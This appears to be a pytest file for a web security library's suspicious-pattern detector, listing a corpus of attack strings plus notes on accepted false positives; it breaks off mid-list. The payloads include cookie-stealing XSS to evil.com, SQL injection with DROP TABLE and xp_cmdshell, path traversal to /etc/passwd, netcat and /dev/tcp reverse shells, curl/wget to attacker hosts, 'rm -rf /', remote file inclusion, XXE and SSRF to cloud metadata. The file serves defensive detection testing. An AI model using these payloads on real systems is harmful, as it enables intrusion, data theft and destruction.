import time
from typing import NamedTuple

import coverage
import pytest

from guard_core.handlers.suspatterns_handler import (
    ALL_DETECTION_CATEGORIES,
    CATEGORY_CONTEXT_MAP,
    SusPatternsManager,
)
from guard_core.models import SecurityConfig


def _cov_scale() -> float:
    return 1.0 + 1.0 * (coverage.Coverage.current() is not None)


class MaliciousCase(NamedTuple):
    case_id: str
    category: str
    payload: str
    detector: str = "production"
    known_gap_reason: str = ""


_NESTED_SCRIPT_VALUE_KNOWN_FP_REASON = (
    "D-74 and D-75: v4.4.0 flags a nested script or source-map path, and the head "
    "keeps that floor. In a URL path the matched route template decides (clean when "
    "it declares the extension); a value in a body or query carries no route, so a "
    "nested path value stays flagged exactly as in v4.4.0"
)


class BenignCase(NamedTuple):
    case_id: str
    payload: str
    detector: str = "production"
    known_false_positive_reason: str = ""


def _build_isolated_manager(config: SecurityConfig | None) -> SusPatternsManager:
    original_instance = SusPatternsManager._instance
    original_config = SusPatternsManager._config
    SusPatternsManager._instance = None
    SusPatternsManager._config = None
    manager = SusPatternsManager(config) if config else SusPatternsManager()
    SusPatternsManager._instance = original_instance
    SusPatternsManager._config = original_config
    return manager


_LEGACY_MANAGER = _build_isolated_manager(None)
_PRODUCTION_MANAGER = _build_isolated_manager(SecurityConfig())

_ENCODING_AWARE_MANAGER = _build_isolated_manager(SecurityConfig())
_ENCODING_AWARE_MANAGER._semantic_analyzer = None

_DETECTORS: dict[str, SusPatternsManager] = {
    "production": _PRODUCTION_MANAGER,
    "legacy": _LEGACY_MANAGER,
    "encoding_aware": _ENCODING_AWARE_MANAGER,
}

_LEGACY_SMOKE_DETECTORS: dict[str, SusPatternsManager] = {
    "production": _LEGACY_MANAGER,
    "legacy": _LEGACY_MANAGER,
    "encoding_aware": _ENCODING_AWARE_MANAGER,
}

_TRUNCATION_FILLER = (
    "The quarterly report summarizes engagement metrics across every region "
    "and highlights the onboarding funnel improvements shipped last sprint. "
) * 90

_AMBIGUOUS_BACKTICK_INJECTION_REQUEST_BODY_KNOWN_GAP_REASON = (
    "_AMBIGUOUS_BACKTICK_INJECTION_CONTEXTS in _suspatterns_shell_sources.py "
    "deliberately resolves an ambiguous glued-backtick or dollar-substitution "
    "match as a hit only in query_param/url_path, by design, because prose "
    "and markdown legitimately carry backticks and $(...) in request bodies; "
    "this item is detected on query_param and url_path and undetected on "
    "request_body by that same rule. Widening the rule to request_body was "
    "measured: +8 detections in this class but +8 new benign hits (jQuery "
    "selector calls, Makefile variable references, shell-docs var expansion, "
    "glued kebab identifiers), so the rule stays narrow and this is the "
    "documented cost"
)


_SEMICOLON_QUOTED_SHELL_KNOWN_FP_REASON = (
    "a quoted absolute-path or env-prefixed shell invocation after a "
    "semicolon is character-identical to the attack shape the widened "
    "cmd_injection shell pattern must catch; the surface is symmetric with "
    "the bare-shell form that fired in every released version, and "
    "separating a quoted invocation from a real one requires contextual "
    "evaluation, not regex shape"
)

_SEMICOLON_BARE_SHELL_CONTROL_KNOWN_FP_REASON = (
    "the bare-shell form of this prose shape fired in every released "
    "version before the absolute-path and env-prefixed widening; pinned as "
    "the control case the new pins are symmetric with"
)

_SH_DASH_C_URL_PATH_KNOWN_FP_REASON = (
    "D-70 and D-143: a URL path holding sh -c with a known command is flagged "
    "whatever words follow; trailing words never clear an attack"
)

_WHOLE_VALUE_SHELL_INVOCATION_KNOWN_FP_REASON = (
    "a field whose entire value is an absolute-path or env-prefixed shell "
    "invocation spec, the Docker/K8s command or entrypoint override shape, "
    "is character-identical to the attack shape the widened cmd_injection "
    "shell pattern must catch; the surface is symmetric with the bare-shell "
    "form that fired in every released version, and an API that "
    "legitimately carries command specs needs route-level configuration, "
    "not a narrower pattern"
)

_WHOLE_VALUE_BARE_SHELL_CONTROL_KNOWN_FP_REASON = (
    "the bare-shell form of this whole-value shape fired in every released "
    "version before the absolute-path and env-prefixed widening; pinned as "
    "the control case the new pins are symmetric with"
)

_ENV_VAR_PREFIXED_SHELL_DASH_C_CI_CONFIG_KNOWN_FP_REASON = (
    "the bounded {0,8} var=val-prefix widening of the newline-delivered "
    "shell -c pattern accepts one or more VAR=val assignments, chained up "
    "to 8 deep, immediately before an env/shell invocation; a CI YAML run "
    "step, a crontab line, and a Makefile recipe that legitimately prefix "
    "a shell -c call with inline environment assignments (FOO=bar BAZ=qux "
    "bash -c '...', PATH=/usr/bin:/bin bash -c '...') are character-"
    "identical to that attack shape and cannot be told apart by structure "
    "alone; these are benign in CI/config contexts and are exactly the "
    "kind of shape users allowlist. The widened FP surface is accepted "
    "with honest disclosure rather than narrowing the {0,8} bound back "
    "and losing recall on the chained assignment-prefixed shell "
    "injection shape it was built to catch"
)

_SQLI_ORDER_BY_BARE_DIGIT_KNOWN_FP_REASON = (
    "a standalone 'ORDER BY <digit>' with no SQL comment/statement "
    "terminator after it is character-identical to a real sort-order "
    "value or path segment a REST API commonly carries (a sort "
    "parameter, a column-index path segment); _SQLI_ORDER_BY_TERMINATOR_RE "
    "has matched this bare shape on query_param/request_body since "
    "before this widening round and continues to, so this is a "
    "newly-disclosed, not newly-introduced, false positive on those two "
    "contexts; the pattern is narrowed to _CTX_SQLI_NARROW "
    "(_suspatterns_pattern_table.py) precisely so header/url_path, "
    "newly enabled by this round, do not inherit it"
)

_SQLI_GLUED_COMMENT_ANNOTATION_KNOWN_FP_REASON = (
    "a C-style /* ... */ comment glued between two word characters is "
    "the exact obfuscation shape SQL keyword-splitting evasion uses "
    "(SEL/**/ECT) and is also the exact shape of an ordinary inline "
    "unit or config annotation (timeout/*ms*/30); this pattern has "
    "matched that shape on query_param/request_body since before this "
    "widening round, so this is a newly-disclosed, not "
    "newly-introduced, false positive there; no malicious corpus entry "
    "depends on this pattern reaching header/url_path (measured: 0 of "
    "36 sqli cases), so it is narrowed to _CTX_SQLI_NARROW there with "
    "zero recall cost"
)

_SQLI_EXEC_PROSE_INSTRUCTION_KNOWN_FP_REASON = (
    "'EXEC(UTE) sp_/xp_<name>' with no statement-separator or quote "
    "immediately before it is indistinguishable from an operational "
    "runbook or support-ticket instruction naming a real stored "
    "procedure by its sp_/xp_-prefixed name; this pattern has matched "
    "that shape on query_param/request_body since before this widening "
    "round, so this is a newly-disclosed, not newly-introduced, false "
    "positive there. The added _SQLI_EXEC_STRONG_RE variant (requires "
    "the match to be preceded only by ';', a quote, or the start of "
    "the string) recovers full recall on header/url_path for the two "
    "corpus entries that actually carry that separator ('1; EXEC "
    "xp_cmdshell(...)', '1; EXECUTE sp_configure') without also "
    "matching this prose shape there; the original, "
    "separator-tolerant pattern stays narrowed to query_param/"
    "request_body"
)

_RFI_TARGET_EXTENSION_DOWNLOAD_LINK_KNOWN_FP_REASON = (
    "the dedicated RFI file_inclusion pattern flags any param-value "
    "delivery of an explicit http(s)/ftp URL whose final path segment ends "
    "in one of the RFI executable/includable target extensions; a genuine "
    "raw-doc download link (README.txt, readme.txt, terms.txt) is "
    "character-identical to that param=scheme://host/path.ext RFI payload "
    "shape and cannot be told apart by extension alone, because the "
    "backdoor.txt-shaped payload this pattern was built to catch depends "
    "on the fetched content containing script tags, not on the extension "
    "or path depth; an app that legitimately serves such download links "
    "needs route-level allowlisting, not a narrower pattern that would "
    "lose recall on file_inclusion_rfi_https_domain_backdoor_txt. The "
    ".sh/.cgi target extensions were dropped from the alternation instead: "
    "0 malicious corpus entries depend on either (measured), so "
    "install.sh/search.cgi-shaped curl-pipe installer and legacy cgi-bin "
    "links no longer collide with this pattern at zero recall cost"
)

_SSTI_HASH_BRACE_CALL_SYNTAX_KNOWN_FP_REASON = (
    "the hash-brace #{ } shape gate's call-branch flags any bare "
    "function-call shape (a word immediately followed by parentheses) "
    "appearing anywhere inside the braces; a genuine method call on a "
    "string or object (helper.format(value)) is character-identical to "
    "that call-branch SSTI shape and cannot be told apart by structure "
    "alone. Narrowing the call-branch to empty-parens-only (as the "
    "sibling {{ }} gate now does) was tried and reverted: it lost recall "
    "on two real corpus dependents that pass non-empty arguments to the "
    "flagged call (template_ssti_hash_brace_java_runtime_exec's "
    "T(java.lang.Runtime).exec('id'), and the embedded-terminator regression "
    'corpus\'s #{"a#b".gsub(/x/,"y")}); an app that legitimately accepts '
    "raw template source as a request value needs route-level "
    "allowlisting, not a narrower call-branch"
)


_SSRF_BARE_PRIVATE_IP_NO_URL_CONTEXT_KNOWN_FP_REASON = (
    "a bare private/loopback/link-local IP address extracted from a query "
    "param, header, or JSON body field value, with no surrounding URL "
    "context (no scheme, no path segment after it, no port), is "
    "character-identical to the same bare IP planted as a raw SSRF probe "
    "value in that same field; test_ssrf_corpus.py::KNOWN_GOOD_SSRF_TARGETS "
    "pins the identical bare shape ('10.0.0.5', '127.0.0.1', "
    "'192.168.1.1') as a required detection so a metadata/loopback/private "
    "IP dropped bare into any field is still caught, and cannot be told "
    "apart by structure alone from a legitimate internal upstream/host "
    "value. An application that legitimately carries bare internal IPs in "
    "a named field should exclude that field via "
    "excluded_detection_params/excluded_detection_headers/"
    "excluded_detection_body_fields rather than narrowing the pattern and "
    "losing recall on the bare-IP SSRF probe shape"
)


def _payload_as_ingested_from_the_wire(raw: bytes) -> str:
    return raw.decode("utf-8", errors="surrogateescape")


MALICIOUS_CORPUS: list[MaliciousCase] = [
    MaliciousCase("xss_basic_script_alert", "xss", "<script>alert(1)</script>"),
    MaliciousCase(
        "xss_cookie_exfil",
        "xss",
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    ),
    MaliciousCase(
        "xss_javascript_protocol", "xss", "javascript:alert(document.cookie)"
    ),
    MaliciousCase("xss_img_onerror", "xss", "<img src=x onerror=alert(1)>"),
    MaliciousCase("xss_body_onload", "xss", "<body onload=alert(1)>"),
    MaliciousCase(
        "xss_anchor_href_javascript", "xss", '<a href="javascript:alert(1)">click</a>'
    ),
    MaliciousCase(
        "xss_style_url_expression",
        "xss",
        '<div style="background:url(javascript:alert(1))">',
    ),
    MaliciousCase(
        "xss_div_style_expression_spaced_equals",
        "xss",
        '<div style = "expression(alert(1))">',
    ),
    MaliciousCase(
        "xss_anchor_href_data_uri_spaced_equals",
        "xss",
        '<a href = "data:text/html,evil">click</a>',
    ),
    MaliciousCase("xss_object_tag", "xss", '<object data="evil.html">payload</object>'),
    MaliciousCase("xss_svg_onload", "xss", "<svg onload=alert(1)>"),
    MaliciousCase("xss_embed_tag", "xss", "<embed src=evil.swf>malicious</embed>"),
    MaliciousCase(
        "xss_onerror_space_after_equals", "xss", "<img src=x onerror= alert(1)>"
    ),
    MaliciousCase(
        "xss_onerror_space_around_equals", "xss", "<img src=x onerror = alert(1)>"
    ),
    MaliciousCase("xss_div_onclick_spaced_equals_quoted", "xss", '<div onclick = "x">'),
    MaliciousCase(
        "xss_onerror_tab_after_equals", "xss", "<img src=x onerror=\talert(1)>"
    ),
    MaliciousCase(
        "xss_onerror_newline_after_equals", "xss", "<img src=x onerror=\nalert(1)>"
    ),
    MaliciousCase(
        "xss_onerror_percent_encoded_space_after_equals",
        "xss",
        "<img src=x onerror=%20alert(1)>",
    ),
    MaliciousCase(
        "xss_onerror_space_after_equals_quoted_value",
        "xss",
        '<img src=x onerror= "alert(1)">',
    ),
    MaliciousCase(
        "xss_base64_wrapped_script_alert",
        "xss",
        "PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+",
        "encoding_aware",
    ),
    MaliciousCase(
        "xss_past_truncation_cutoff_script_alert",
        "xss",
        _TRUNCATION_FILLER + "<script>alert(document.cookie)</script>",
        "encoding_aware",
    ),
    MaliciousCase(
        "xss_base64_wrapped_script_alert_with_cyrillic_suffix",
        "xss",
        "PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"
        "0JDQkdCS0JPQlNCV0JbQl9CY0Jk=",
        "encoding_aware",
    ),
    MaliciousCase(
        "xss_base64_wrapped_script_alert_with_invalid_utf8_byte",
        "xss",
        "PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+gA==",
        "encoding_aware",
    ),
    MaliciousCase(
        "sqli_select_where_password", "sqli", "SELECT password FROM users WHERE id=1"
    ),
    MaliciousCase("sqli_numeric_tautology_comment", "sqli", "1 OR 1=1--"),
    MaliciousCase("sqli_numeric_tautology_bare", "sqli", "1 OR 1=1"),
    MaliciousCase("sqli_numeric_tautology_lower", "sqli", "1 or 1=1"),
    MaliciousCase("sqli_numeric_tautology_five", "sqli", "5 OR 5=5"),
    MaliciousCase("sqli_numeric_tautology_and", "sqli", "1 AND 1=1"),
    MaliciousCase("sqli_numeric_tautology_param", "sqli", "id=1 OR 1=1--"),
    MaliciousCase("sqli_placeholder_pct_s_tautology", "sqli", "WHERE id = %s;OR1=1--"),
    MaliciousCase("sqli_placeholder_qmark_tautology", "sqli", "WHERE id = ?;OR1=1--"),
    MaliciousCase("sqli_placeholder_dollar_tautology", "sqli", "WHERE id = $1;OR1=1--"),
    MaliciousCase("sqli_select_star", "sqli", "SELECT * FROM accounts"),
    MaliciousCase("sqli_union_select_null", "sqli", "' UNION SELECT NULL,NULL,NULL--"),
    MaliciousCase("sqli_or_tautology", "sqli", "1' OR '1'='1"),
    MaliciousCase("sqli_trailing_comment_dashdash", "sqli", "admin'--"),
    MaliciousCase("sqli_stacked_drop_table", "sqli", "1'; DROP TABLE users;--"),
    MaliciousCase("sqli_stacked_create_table", "sqli", "1; CREATE TABLE evil (a int)"),
    MaliciousCase("sqli_stacked_insert_into", "sqli", "1; INSERT INTO logs VALUES(1)"),
    MaliciousCase("sqli_stacked_update_set", "sqli", "1; UPDATE users SET admin=1"),
    MaliciousCase("sqli_stacked_delete_from", "sqli", "1; DELETE FROM sessions"),
    MaliciousCase("sqli_stacked_select_from", "sqli", "1; SELECT name FROM users"),
    MaliciousCase("sqli_stacked_replace_into", "sqli", "1; REPLACE INTO t VALUES(1)"),
    MaliciousCase("sqli_exec_xp_cmdshell", "sqli", "1; EXEC xp_cmdshell('whoami')"),
    MaliciousCase("sqli_exec_sp_configure", "sqli", "1; EXECUTE sp_configure"),
    MaliciousCase("sqli_time_based_sleep", "sqli", "id=5 AND SLEEP(5)"),
    MaliciousCase(
        "sqli_benchmark_blind", "sqli", "id=1 AND BENCHMARK(5000000,MD5('A'))"
    ),
    MaliciousCase(
        "sqli_load_file_read", "sqli", "id=1 UNION SELECT LOAD_FILE('/etc/passwd')"
    ),
    MaliciousCase("sqli_mysql_version_comment", "sqli", "1' /*!50000OR*/ '1'='1"),
    MaliciousCase("sqli_outfile_write", "sqli", "SELECT 'x' INTO OUTFILE '/tmp/x.php'"),
    MaliciousCase("sqli_order_by_enum", "sqli", "1' ORDER BY 1--"),
    MaliciousCase(
        "sqli_base64_wrapped_select_where",
        "sqli",
        "U0VMRUNUIHBhc3N3b3JkIEZST00gdXNlcnMgV0hFUkUgaWQ9MQ==",
        "encoding_aware",
    ),
    MaliciousCase("sqli_order_by_string_end_no_comment", "sqli", "1' ORDER BY 3"),
    MaliciousCase("sqli_hash_comment_string_end", "sqli", "admin'#"),
    MaliciousCase(
        "sqli_embedded_trailing_hash_comment",
        "sqli",
        "comment='malicious'#\nrest of json continues after",
    ),
    MaliciousCase(
        "sqli_standalone_hash_comment_control", "sqli", "comment='malicious'#"
    ),
    MaliciousCase(
        "sqli_embedded_order_by_with_trailing_header",
        "sqli",
        "sort=ORDER BY 1\nX-Extra-Header: value",
    ),
    MaliciousCase("sqli_standalone_order_by_control", "sqli", "ORDER BY 1"),
    MaliciousCase(
        "sqli_waitfor_delay_path_segment",
        "sqli",
        "/reports/WAITFOR DELAY '0:0:5'",
    ),
    MaliciousCase("sqli_waitfor_time_header_value", "sqli", "WAITFOR TIME '12:00:00'"),
    MaliciousCase(
        "dir_traversal_double_dotdot_slash", "dir_traversal", "../../../../etc/passwd"
    ),
    MaliciousCase(
        "dir_traversal_windows_backslash",
        "dir_traversal",
        "..\\..\\..\\..\\windows\\win.ini",
    ),
    MaliciousCase(
        "dir_traversal_etc_passwd_suffix", "dir_traversal", "uploads/../../etc/passwd"
    ),
    MaliciousCase(
        "dir_traversal_etc_shadow_suffix", "dir_traversal", "files/../../etc/shadow"
    ),
    MaliciousCase(
        "dir_traversal_boot_ini_suffix", "dir_traversal", "download?file=../../boot.ini"
    ),
    MaliciousCase(
        "dir_traversal_proc_self_environ",
        "dir_traversal",
        "logs/../../proc/self/environ",
    ),
    MaliciousCase(
        "dir_traversal_regression7_etc_passwd_bare", "dir_traversal", "/etc/passwd"
    ),
    MaliciousCase(
        "dir_traversal_regression7_relative_etc_shadow",
        "dir_traversal",
        "../../etc/shadow",
    ),
    MaliciousCase(
        "path_traversal_encoded_dotdot", "path_traversal", "%2e%2e/%2e%2e/etc/passwd"
    ),
    MaliciousCase(
        "path_traversal_double_encoded_dotdot",
        "path_traversal",
        "%252e%252e/%252e%252e/etc/passwd",
    ),
    MaliciousCase(
        "path_traversal_unicode_fullwidth_dot",
        "path_traversal",
        "%uff0e%uff0e/etc/passwd",
    ),
    MaliciousCase(
        "path_traversal_overlong_utf8_dot", "path_traversal", "%c0%ae%c0%ae/etc/passwd"
    ),
    MaliciousCase(
        "path_traversal_double_url_encoded_slash",
        "path_traversal",
        "%25c0%25ae/etc/passwd",
    ),
    MaliciousCase(
        "path_traversal_single_segment_literal_dot_encoded_slash",
        "path_traversal",
        "..%2fconfig.yaml",
    ),
    MaliciousCase(
        "path_traversal_single_segment_overlong_utf8_slash",
        "path_traversal",
        "..%c0%afconfig.yaml",
    ),
    MaliciousCase(
        "path_traversal_single_segment_iis_unicode_slash",
        "path_traversal",
        "..%u2215config.yaml",
    ),
    MaliciousCase(
        "path_traversal_single_segment_encoded_dot_pair_encoded_slash",
        "path_traversal",
        "%2e%2e%2fconfig.yaml",
    ),
    MaliciousCase(
        "path_traversal_single_segment_partial_encoded_dot",
        "path_traversal",
        ".%2e/config.yaml",
    ),
    MaliciousCase(
        "dir_traversal_semicolon_path_parameter_bypass",
        "dir_traversal",
        "..;/config.yaml",
    ),
    MaliciousCase(
        "path_traversal_single_segment_overlong_lead_byte_literal_slash",
        "path_traversal",
        "..%c0%2fconfig.yaml",
    ),
    MaliciousCase(
        "path_traversal_single_segment_per_digit_double_encoded_slash",
        "path_traversal",
        "..%25%32%66config.yaml",
    ),
    MaliciousCase(
        "path_traversal_single_segment_null_byte_before_literal_slash",
        "path_traversal",
        "..%00/config.yaml",
    ),
    MaliciousCase("cmd_bare_backtick_whoami", "cmd_injection", "`whoami`"),
    MaliciousCase("cmd_bare_backtick_id", "cmd_injection", "`id`"),
    MaliciousCase(
        "cmd_separator_semicolon_cat_flag", "cmd_injection", "; cat -la /etc/passwd"
    ),
    MaliciousCase("cmd_pipe_wget", "cmd_injection", "| wget http://evil.example/x"),
    MaliciousCase("cmd_separator_dollar_paren", "cmd_injection", "; $(whoami)"),
    MaliciousCase(
        "cmd_separator_dollar_brace", "cmd_injection", "| ${IFS}cat${IFS}/etc/passwd"
    ),
    MaliciousCase("cmd_shell_dash_c", "cmd_injection", "; bash -c id"),
    MaliciousCase(
        "cmd_eval_call",
        "cmd_injection",
        "eval(\"require('child_process').exec('id')\")",
    ),
    MaliciousCase("cmd_separator_pipe_id", "cmd_injection", "|id"),
    MaliciousCase(
        "cmd_netcat_reverse_shell", "cmd_injection", "nc -e /bin/sh 10.0.0.1 4444"
    ),
    MaliciousCase(
        "cmd_dev_tcp_reverse_shell", "cmd_injection", "/dev/tcp/10.0.0.1/4444"
    ),
    MaliciousCase("cmd_chained_semicolon_id_whoami", "cmd_injection", "`id`; `whoami`"),
    MaliciousCase("cmd_separator_ampersand_reboot", "cmd_injection", "& `reboot`"),
    MaliciousCase(
        "cmd_double_pipe_curl", "cmd_injection", "|| curl http://evil.example/x"
    ),
    MaliciousCase(
        "cmd_separator_semicolon_nc",
        "cmd_injection",
        "; nc -e /bin/sh 10.0.0.1 4444",
    ),
    MaliciousCase(
        "cmd_base64_wrapped_reverse_shell",
        "cmd_injection",
        "fCBuYyAtZSAvYmluL3NoIDEwLjAuMC4xIDQ0NDQ=",
        "encoding_aware",
    ),
    MaliciousCase(
        "cmd_base64_wrapped_query_param",
        "cmd_injection",
        "payload=fCBuYyAtZSAvYmluL3NoIDEwLjAuMC4xIDQ0NDQ=",
        "encoding_aware",
    ),
    MaliciousCase(
        "cmd_past_truncation_cutoff_semicolon_cat",
        "cmd_injection",
        _TRUNCATION_FILLER + "; cat /etc/passwd",
        "encoding_aware",
    ),
    MaliciousCase(
        "cmd_past_truncation_cutoff_backtick_whoami",
        "cmd_injection",
        _TRUNCATION_FILLER + "`whoami`",
        "encoding_aware",
    ),
    MaliciousCase("cmd_shell_dash_c_at_string_start", "cmd_injection", "sh -c id"),
    MaliciousCase(
        "cmd_injection_embedded_in_description_field",
        "cmd_injection",
        "some description field\nbash -c 'rm -rf /'",
    ),
    MaliciousCase(
        "cmd_injection_standalone_bash_rm_rf_control",
        "cmd_injection",
        "bash -c 'rm -rf /'",
    ),
    MaliciousCase("cmd_absolute_path_shell_dash_c", "cmd_injection", "/bin/sh -c id"),
    MaliciousCase("cmd_env_prefixed_shell_dash_c", "cmd_injection", "env bash -c id"),
    MaliciousCase(
        "cmd_injection_base64_hex_safe_evasion_netcat",
        "cmd_injection",
        "aCA5aCA0fE5De0A0aCA6",
        "encoding_aware",
    ),
    MaliciousCase(
        "file_inclusion_php_wrapper",
        "file_inclusion",
        "php://filter/convert.base64-encode/resource=index.php",
    ),
    MaliciousCase(
        "file_inclusion_data_wrapper",
        "file_inclusion",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOw==",
    ),
    MaliciousCase("file_inclusion_expect_wrapper", "file_inclusion", "expect://id"),
    MaliciousCase(
        "file_inclusion_zip_wrapper",
        "file_inclusion",
        "zip://shell.jpg%23payload.php",
    ),
    MaliciousCase(
        "file_inclusion_phar_wrapper",
        "file_inclusion",
        "phar://upload/shell.phar/payload.txt",
    ),
    MaliciousCase(
        "file_inclusion_protocol_relative_bare",
        "file_inclusion",
        "//evil.com/shell.txt",
    ),
    MaliciousCase(
        "file_inclusion_protocol_relative_param",
        "file_inclusion",
        "?file=//evil.com/x.txt",
    ),
    MaliciousCase(
        "file_inclusion_protocol_relative_src",
        "file_inclusion",
        "src=//evil.io/malicious.js",
    ),
    MaliciousCase(
        "file_inclusion_rfi_http_domain_shell_php",
        "file_inclusion",
        "?page=http://attacker.com/shell.php",
    ),
    MaliciousCase(
        "file_inclusion_rfi_https_domain_backdoor_txt",
        "file_inclusion",
        "?file=https://evil.example/backdoor.txt",
    ),
    MaliciousCase(
        "file_inclusion_rfi_ftp_domain_inc_phtml",
        "file_inclusion",
        "?template=ftp://evil/inc.phtml",
    ),
    MaliciousCase(
        "file_inclusion_rfi_http_ipv4_query_string",
        "file_inclusion",
        "?include=http://198.51.100.7/c99.php?cmd=id",
    ),
    MaliciousCase(
        "file_inclusion_rfi_https_domain_shell_asp",
        "file_inclusion",
        "?page=https://evil.example.com/shell.asp",
    ),
    MaliciousCase(
        "file_inclusion_rfi_http_domain_webshell_jsp",
        "file_inclusion",
        "?file=http://malicious-host.example/webshell.jsp",
    ),
    MaliciousCase(
        "file_inclusion_rfi_http_domain_backdoor_pl",
        "file_inclusion",
        "?exec=http://attacker.net/backdoor.pl",
    ),
    MaliciousCase(
        "file_inclusion_rfi_https_domain_payload_phar",
        "file_inclusion",
        "?load=https://evil.io/payload.phar",
    ),
    MaliciousCase("ldap_wildcard_or_filter", "ldap", "(|(uid=*)(cn=*))"),
    MaliciousCase("ldap_wildcard_equals", "ldap", "cn=*)(uid=*"),
    MaliciousCase("ldap_and_filter_injection", "ldap", "(&(objectClass=user)(uid=*))"),
    MaliciousCase("ldap_bare_or_paren", "ldap", "admin)(|(password=*"),
    MaliciousCase("ldap_wildcard_password_bypass", "ldap", "*)(password=*)"),
    MaliciousCase("ldap_nested_filter_bypass", "ldap", "(|(&"),
    MaliciousCase("ldap_double_paren_wildcard_breakout", "ldap", "*)((objectClass=*"),
    MaliciousCase("ldap_null_byte_truncation_breakout", "ldap", "*))%00"),
    MaliciousCase(
        "ldap_wildcard_no_attr_extensible_match", "ldap", "*)(:caseExactMatch:=admin"
    ),
    MaliciousCase(
        "ldap_wildcard_no_attr_oid_rule", "ldap", "*)(:1.2.840.113556.1.4.804:=admin"
    ),
    MaliciousCase(
        "ldap_wildcard_no_attr_dn_oid_rule",
        "ldap",
        "*)(:dn:1.2.840.113556.1.4.804:=admin",
    ),
    MaliciousCase(
        "ldap_wildcard_numericoid_attr_equality", "ldap", "*)(1.3.6.1.4.1.1466.0=admin"
    ),
    MaliciousCase(
        "ldap_wildcard_numericoid_attr_wildcard_extraction",
        "ldap",
        "*)(1.3.6.1.4.1.1466.0=*)",
    ),
    MaliciousCase(
        "ldap_wildcard_numericoid_attr_extensible_match",
        "ldap",
        "*)(1.2.840.113556.1.4.804:=admin",
    ),
    MaliciousCase(
        "ldap_wildcard_attr_options_extensible_match", "ldap", "*)(cn;lang-en:=admin"
    ),
    MaliciousCase(
        "ldap_wildcard_attr_multi_options_extensible_match",
        "ldap",
        "*)(cn;lang-en;binary:=admin",
    ),
    MaliciousCase(
        "ldap_numericoid_attr_approximate_comparator_breakout",
        "ldap",
        "uid=foo)(1.2.840~=admin",
    ),
    MaliciousCase(
        "ldap_no_attr_extensible_match_approximate_comparator_breakout",
        "ldap",
        "uid=foo)(:caseExactMatch~=admin",
    ),
    MaliciousCase(
        "ldap_attr_options_approximate_comparator_breakout",
        "ldap",
        "uid=foo)(cn;lang-en~=admin",
    ),
    MaliciousCase(
        "ldap_query_surface_wildcard_no_attr_extensible_match",
        "ldap",
        "q=*)(:caseExactMatch:=admin",
    ),
    MaliciousCase(
        "ldap_query_surface_wildcard_numericoid_attr_wildcard_extraction",
        "ldap",
        "q=*)(1.3.6.1.4.1.1466.0=*)",
    ),
    MaliciousCase(
        "xml_external_entity_file",
        "xml",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    ),
    MaliciousCase(
        "xml_external_entity_http",
        "xml",
        '<!ENTITY xxe SYSTEM "http://evil.example/xxe">',
    ),
    MaliciousCase(
        "xml_cdata_script_wrapper", "xml", "<![CDATA[<script>alert(1)</script>]]>"
    ),
    MaliciousCase(
        "xml_declaration_with_entity",
        "xml",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/shadow">]>',
    ),
    MaliciousCase(
        "ssrf_aws_metadata_ip", "ssrf", "http://169.254.169.254/latest/meta-data/"
    ),
    MaliciousCase("ssrf_localhost_admin", "ssrf", "http://localhost:8080/admin"),
    MaliciousCase("ssrf_private_class_c", "ssrf", "http://192.168.1.1/admin"),
    MaliciousCase("ssrf_private_class_a", "ssrf", "http://10.0.0.1/admin"),
    MaliciousCase(
        "ssrf_gcp_metadata_internal",
        "ssrf",
        "http://metadata.google.internal/computeMetadata/v1/",
    ),
    MaliciousCase("ssrf_decimal_encoded_loopback", "ssrf", "http://2130706433/"),
    MaliciousCase("ssrf_octal_encoded_loopback", "ssrf", "http://0177.0.0.1/"),
    MaliciousCase("ssrf_hex_encoded_loopback", "ssrf", "http://0x7f000001/"),
    MaliciousCase("ssrf_hex_dotted_private_192", "ssrf", "http://0xC0.0xA8.1.1/"),
    MaliciousCase("ssrf_file_wrapper", "ssrf", "file:///etc/passwd"),
    MaliciousCase("ssrf_gopher_wrapper", "ssrf", "gopher://127.0.0.1:6379/_INFO"),
    MaliciousCase("ssrf_dict_wrapper", "ssrf", "dict://127.0.0.1:11211/stat"),
    MaliciousCase(
        "ssrf_alibaba_metadata", "ssrf", "http://100.100.100.200/latest/meta-data/"
    ),
    MaliciousCase("ssrf_unspecified_with_port", "ssrf", "reset via 0.0.0.0:9999 first"),
    MaliciousCase(
        "ssrf_regression2_bare_aws_metadata", "ssrf", "http://169.254.169.254/"
    ),
    MaliciousCase("ssrf_regression2_bare_loopback", "ssrf", "http://127.0.0.1/"),
    MaliciousCase(
        "ssrf_regression2_bare_localhost_port", "ssrf", "http://localhost:8080/"
    ),
    MaliciousCase("ssrf_regression2_bare_private_class_a", "ssrf", "http://10.0.0.5/"),
    MaliciousCase(
        "ssrf_regression2_bare_private_class_c", "ssrf", "http://192.168.1.1/"
    ),
    MaliciousCase("ssrf_regression2_bare_ipv6_loopback", "ssrf", "http://[::1]/"),
    MaliciousCase("ssrf_regression9_bare_zero_host", "ssrf", "http://0/"),
    MaliciousCase("ssrf_regression9_zero_host_with_port", "ssrf", "http://0:8080/"),
    MaliciousCase(
        "ssrf_base64_wrapped_metadata_url",
        "ssrf",
        "aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw==",
        "encoding_aware",
    ),
    MaliciousCase(
        "ssrf_past_truncation_cutoff_metadata",
        "ssrf",
        _TRUNCATION_FILLER + "http://169.254.169.254/latest/meta-data/",
        "encoding_aware",
    ),
    MaliciousCase(
        "ssrf_ipv4_mapped_ipv6_loopback_bracket",
        "ssrf",
        "http://[::ffff:127.0.0.1]/",
    ),
    MaliciousCase("ssrf_localhost_trailing_dot", "ssrf", "http://localhost./"),
    MaliciousCase(
        "ssrf_metadata_ip_with_path_after_extraction",
        "ssrf",
        "169.254.169.254/latest/meta-data/",
    ),
    MaliciousCase("ssrf_loopback_with_port_after_extraction", "ssrf", "127.0.0.1:6379"),
    MaliciousCase("nosql_gt_operator_quoted", "nosql", '{"$gt":""}'),
    MaliciousCase("nosql_ne_operator_quoted", "nosql", '{"$ne":null}'),
    MaliciousCase(
        "nosql_where_operator_object",
        "nosql",
        '{"$where": "this.password.length > 0"}',
    ),
